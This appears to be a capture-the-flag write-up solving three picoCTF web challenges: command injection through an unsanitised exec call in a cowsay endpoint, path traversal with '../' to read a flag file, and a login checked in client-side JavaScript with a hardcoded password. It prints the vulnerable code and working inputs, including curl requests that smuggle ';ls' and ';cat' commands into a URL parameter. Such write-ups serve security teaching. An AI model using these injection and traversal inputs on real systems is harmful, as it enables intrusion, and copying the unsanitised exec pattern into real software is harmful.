## 1. Cows As A Service (CaaS)

The vulnerability in this challenge lies in the fact that the application is using `exec` to execute a shell command without properly sanitizing the user input. This allows for Command Injection, a form of injection attack where an attacker can execute arbitrary commands on the host operating system.

The relevant code in `index.js` is:

```javascript
app.get('/cowsay/:message', (req, res) => {
    exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
        if (error) return res.status(500).end();
        res.type('txt').send(stdout).end();
    });
});
```

The `exec` function is used to execute the `cowsay` command with the user-provided message. However, the message is directly appended to the command without any sanitization, allowing for command injection.

To exploit this, you can append a semicolon (`;`) to the message followed by any command you want to execute. The semicolon in shell scripting is used to separate multiple commands.

For example, to list all files in the current directory, you can use the `ls` command:

```bash
curl "https://caas.mars.picoctf.net/cowsay/test;ls"
```

To read the contents of the `falg.txt` file, you can use the `cat` command:

```bash
curl "https://caas.mars.picoctf.net/cowsay/test;cat<falg.txt"
```

## 2. Forbidden Paths

The challenge here is to read the file `/flag.txt` without using absolute paths. The solution is to use relative paths.

Assuming the current directory is `/usr/share/nginx/html/`, you can use the `../` notation to navigate up the directory tree. Each `../` goes up one level. So to reach the root directory from the current directory, you can use `../../../../`.

Then, you can append the relative path to the `flag.txt` file to reach it:

```bash
../../../../flag.txt
```

## 3. Local Authority

The vulnerability in this challenge is that the application is checking the username and password on the client side, which is insecure because the client-side code can be easily viewed and modified by the user.

The relevant JavaScript code is:

```javascript
function checkPassword(username, password)
{
  if( username === 'admin' && password === 'strongPassword098765' )
  {
    return true;
  }
  else
  {
    return false;
  }
}
```

This function checks if the username is `admin` and the password is `strongPassword098765`. If they are, the function returns `true`, allowing you to log in.

To exploit this, you can simply use `admin` as the username and `strongPassword098765` as the password to log in and get the flag.
